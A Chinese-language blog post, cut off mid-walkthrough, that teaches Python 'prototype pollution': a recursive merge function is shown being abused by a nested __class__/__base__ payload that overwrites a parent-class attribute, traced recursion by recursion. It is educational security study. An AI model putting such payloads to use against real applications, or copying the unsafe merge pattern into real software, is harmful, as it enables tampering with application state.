<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.7.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.7.0" type="image/png" sizes="32x32"><meta name="description" content="学习文章：https:&#x2F;&#x2F;tttang.com&#x2F;archive&#x2F;1876&#x2F;#toc_-_1；本人在其基础上加入了对于污染过程的动态调试；该动调可以更为直观的将污染的过程展示出来。">
<meta property="og:type" content="article">
<meta property="og:title" content="Prototype Pollution In Python">
<meta property="og:url" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/index.html">
<meta property="og:site_name" content="hey&#39;s blog">
<meta property="og:description" content="学习文章：https:&#x2F;&#x2F;tttang.com&#x2F;archive&#x2F;1876&#x2F;#toc_-_1；本人在其基础上加入了对于污染过程的动态调试；该动调可以更为直观的将污染的过程展示出来。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/2.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/3.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/4.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/5.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/6.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/7.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/8.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/9.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/10.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/11.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/12.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/13.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/14.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/15.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/16.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/17.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/18.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/19.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/20.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/21.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/22.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/23.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/24.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/25.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/23.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/26.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/27.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/28.png">
<meta property="article:published_time" content="2024-01-14T06:43:17.000Z">
<meta property="article:modified_time" content="2024-01-16T12:09:29.976Z">
<meta property="article:author" content="hey">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1.png"><title>Prototype Pollution In Python | hey's blog</title><link ref="canonical" href="https://hyggevv.github.io/2024/01/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.7.0"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"carbon","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: true,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.2"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-menu-item__text">About</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/read/"><span class="header-nav-menu-item__icon"><i class="fas fa-book"></i></span><span class="header-nav-menu-item__text">menu.read</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">hey's blog</div><div class="header-banner-info__subtitle">天气转晴太阳崭新我在前进</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">Prototype Pollution In Python</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-01-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-01-16</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">Visited</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body">
        <h1 id="Basic：def-merge-src-dic">
          <a href="#Basic：def-merge-src-dic" class="heading-link"><i class="fas fa-link"></i></a><a href="#Basic：def-merge-src-dic" class="headerlink" title="Basic：def merge(src,dic)"></a>Basic：def merge(src,dic)</h1>
      <p>原型链的污染的实现需要一个数值合并函数将特定的值污染到类的属性中</p>

        <h2 id="标准代码">
          <a href="#标准代码" class="heading-link"><i class="fas fa-link"></i></a><a href="#标准代码" class="headerlink" title="标准代码"></a>标准代码</h2>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src,dst</span>):    </span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)  </span><br></pre></td></tr></table></div></figure>




        <h2 id="函数解析">
          <a href="#函数解析" class="heading-link"><i class="fas fa-link"></i></a><a href="#函数解析" class="headerlink" title="函数解析"></a>函数解析</h2>
      
        <h3 id="hasattr-object-name">
          <a href="#hasattr-object-name" class="heading-link"><i class="fas fa-link"></i></a><a href="#hasattr-object-name" class="headerlink" title="hasattr(object,name)"></a>hasattr(object,name)</h3>
      <p><code>hasattr(object,name)</code>函数用于判断<code>object</code>对象中是否存在<code>name</code>属性；有则<code>True</code>，无则<code>Flase</code></p>

        <h3 id="getattr-object-name">
          <a href="#getattr-object-name" class="heading-link"><i class="fas fa-link"></i></a><a href="#getattr-object-name" class="headerlink" title="getattr(object,name)"></a>getattr(object,name)</h3>
      <p><code>getattr(object,name)</code>函数用于获取<code>object</code>对象中的<code>name</code>的值</p>

        <h3 id="setattr-object-name-value">
          <a href="#setattr-object-name-value" class="heading-link"><i class="fas fa-link"></i></a><a href="#setattr-object-name-value" class="headerlink" title="setattr(object,name,value)"></a>setattr(object,name,value)</h3>
      <p><code>setattr(object,name,value)</code>函数用于设置属性的值，且该属性不一定是存在的；如果属性不存在则会创建一个新的属性再对其进行赋值</p>

        <h2 id="代码审计">
          <a href="#代码审计" class="heading-link"><i class="fas fa-link"></i></a><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2>
      <p>此时我们对上述的标准代码进行一个审计；此时上述代码先自定义了一个函数<code>merge(src,dst)</code>此时的<code>src</code>为源字典，<code>dst</code>为目标字典；然后使用<code>for</code>循环对源字典进行一个遍历键值对；<code>k</code>代表键，<code>v</code>代表值。接下来代码分为三个分支：<code>if hasattr(dst, &#39;__getitem__&#39;):</code>判断目标字典中是否存在<code>__getitem__</code>来判断代码是否为一个可以索引的字典，如果是则在继续进入下一个判断<code>if dst.get(k) and type(v) == dict:</code>，此时进行判断目标字典是否存在键<code>k</code>且值不为<code>None</code>且其值为一个字典；如果是的话则将源字典合并到目标字典中。若不满足<code>if dst.get(k) and type(v) == dict:</code>则直接源字典的值添加到目标字典中。如果不满足<code>if hasattr(dst, &#39;__getitem__&#39;)</code>则进入第二个分支判断<code> elif hasattr(dst, k) and type(v) == dict:</code>此时判断源字典中是否存在与目标字典相同的键<code>k</code>且其值为一个字典，如果满足则递归调用<code>merge()</code>函数将源字典的值加入目标字典。如果上面两个条件都不满足的话直接使用<code>setattr(object,name,value)</code>进行添加</p>

        <h2 id="举例分析">
          <a href="#举例分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#举例分析" class="headerlink" title="举例分析"></a>举例分析</h2>
      <p>此时请看下面这个示例代码</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src,dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line">src = &#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;John&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span>: <span class="number">30</span>,</span><br><span class="line">    <span class="string">&#x27;address&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;New York&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;zip&#x27;</span>: <span class="string">&#x27;10001&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;languages&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;primary&#x27;</span>: <span class="string">&#x27;English&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;secondary&#x27;</span>: <span class="string">&#x27;Spanish&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dst = &#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Alice&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;address&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;state&#x27;</span>: <span class="string">&#x27;NY&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;hobbies&#x27;</span>: [<span class="string">&#x27;reading&#x27;</span>, <span class="string">&#x27;painting&#x27;</span>]</span><br><span class="line">&#125;</span><br><span class="line">merge(src, dst)</span><br><span class="line"><span class="built_in">print</span>(dst)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># result</span></span><br><span class="line">dst=</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;John&#x27;</span>,  //从src中继承</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span>: <span class="number">30</span>,  //从src中继承</span><br><span class="line">    <span class="string">&#x27;address&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;state&#x27;</span>: <span class="string">&#x27;NY&#x27;</span>,  //从dst中继承</span><br><span class="line">        <span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;New York&#x27;</span>, //从src中继承</span><br><span class="line">        <span class="string">&#x27;zip&#x27;</span>: <span class="string">&#x27;10001&#x27;</span> //从src中继承</span><br><span class="line">    &#125;, </span><br><span class="line">    </span><br><span class="line">    <span class="string">&#x27;languages&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;primary&#x27;</span>: <span class="string">&#x27;English&#x27;</span>,  //从src中继承</span><br><span class="line">        <span class="string">&#x27;secondary&#x27;</span>: <span class="string">&#x27;Spanish&#x27;</span> //从src中继承</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="string">&#x27;hobbies&#x27;</span>: [<span class="string">&#x27;reading&#x27;</span>, <span class="string">&#x27;painting&#x27;</span>],  //从dst中继承</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>所以<code>merge(src.dst)</code>函数的作用就是将源字典中的值继承到了目标字典中；此时若是目标字典中存在与源字典相同的键值都将被源字典替换；而目标字典中没 有存在而源字典中存在的键值都会被补到目标字典之中。</p>

        <h1 id="污染示例">
          <a href="#污染示例" class="heading-link"><i class="fas fa-link"></i></a><a href="#污染示例" class="headerlink" title="污染示例"></a>污染示例</h1>
      
        <h2 id="污染自定义属性">
          <a href="#污染自定义属性" class="heading-link"><i class="fas fa-link"></i></a><a href="#污染自定义属性" class="headerlink" title="污染自定义属性"></a>污染自定义属性</h2>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    sercet = <span class="string">&#x27;haha&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_b</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = son_b()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;sercet&quot;</span> : <span class="string">&quot;Polluted~~~&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(instance)</span><br><span class="line"><span class="built_in">print</span>(instance.sercet)</span><br><span class="line"><span class="built_in">print</span>(instance.__class__)</span><br><span class="line"><span class="built_in">print</span>(instance.__class__.__base__)</span><br><span class="line"><span class="built_in">print</span>(instance.__class__.__base__.sercet)</span><br><span class="line"></span><br><span class="line">merge(payload,instance)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(instance)</span><br><span class="line"><span class="built_in">print</span>(instance.sercet)</span><br><span class="line"><span class="built_in">print</span>(instance.__class__)</span><br><span class="line"><span class="built_in">print</span>(instance.__class__.__base__)</span><br><span class="line"><span class="built_in">print</span>(instance.__class__.__base__.sercet)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># result</span></span><br><span class="line">&lt;__main__.son_b <span class="built_in">object</span> at <span class="number">0x0000018A57B5C400</span>&gt;</span><br><span class="line">haha</span><br><span class="line"></span><br><span class="line">haha</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;__main__.son_b <span class="built_in">object</span> at <span class="number">0x0000018A57B5C400</span>&gt;</span><br><span class="line">Polluted~~~</span><br><span class="line"></span><br><span class="line">Polluted~~~</span><br></pre></td></tr></table></div></figure>


        <h3 id="污染过程分析">
          <a href="#污染过程分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#污染过程分析" class="headerlink" title="污染过程分析"></a>污染过程分析</h3>
      
        <h4 id="代码审计层面">
          <a href="#代码审计层面" class="heading-link"><i class="fas fa-link"></i></a><a href="#代码审计层面" class="headerlink" title="代码审计层面"></a>代码审计层面</h4>
      
        <h5 id="第一次递归">
          <a href="#第一次递归" class="heading-link"><i class="fas fa-link"></i></a><a href="#第一次递归" class="headerlink" title="第一次递归"></a>第一次递归</h5>
      <p>此时在执行了<code>merge()</code>之后，因为我们的<code>instance</code>是<code>class</code>类型，并含有<code>__class__</code>默认属性，并且<code>v</code>也为字典格式；所以执行的是</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">    merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;sercet&quot;</span> : <span class="string">&quot;Polluted~~~&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dst = instance()</span><br></pre></td></tr></table></div></figure>

<p>所以此时执行第一次递归<code>merge(v,getattr(dsk,k))</code>；并且此时的目标通过<code>__class__</code>属性换成了<code>instance</code>对象所属的类<code>son_b</code></p>

        <h5 id="第二次递归">
          <a href="#第二次递归" class="heading-link"><i class="fas fa-link"></i></a><a href="#第二次递归" class="headerlink" title="第二次递归"></a>第二次递归</h5>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">    merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">payload = &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;sercet&quot;</span> : <span class="string">&quot;Polluted~~~&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dst = son_b()</span><br></pre></td></tr></table></div></figure>

<p> 在第二次递归之后执行<code>merge(v, getattr(dst, k))</code>;此时的目标通过<code>__base__</code>属性转换成了<code>son_b</code>类的所属直接父类</p>

        <h5 id="第三次递归">
          <a href="#第三次递归" class="heading-link"><i class="fas fa-link"></i></a><a href="#第三次递归" class="headerlink" title="第三次递归"></a>第三次递归</h5>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">    merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">payload = &#123;</span><br><span class="line">            <span class="string">&quot;sercet&quot;</span> : <span class="string">&quot;Polluted~~~&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dst = father()</span><br></pre></td></tr></table></div></figure>


        <h5 id="污染">
          <a href="#污染" class="heading-link"><i class="fas fa-link"></i></a><a href="#污染" class="headerlink" title="污染"></a>污染</h5>
      <p>在第三次递归时<code>type(v) == dict</code>为<code>Flase</code>；递归结束，此时的<code>v=world</code>不在为字典类型；然后执行语句</p>
